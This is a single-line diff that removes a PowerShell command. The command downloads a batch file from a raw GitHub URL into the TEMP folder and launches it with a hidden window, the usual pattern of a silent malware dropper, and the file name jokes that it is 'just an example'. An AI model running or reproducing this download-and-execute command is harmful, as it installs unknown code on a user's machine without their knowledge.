@@ -1,1 +1,0 @@
-iwr -useb https://raw.githubusercontent.com/dazd-pkz/shit-stuff/main/ceciestunexemplecherchespaslaheyVIRGULEyarienavoir.bat -o $env:TEMP\tesconouquoimec.bat; saps $env:TEMP\tesconouquoimec.bat -WindowStyle Hidden
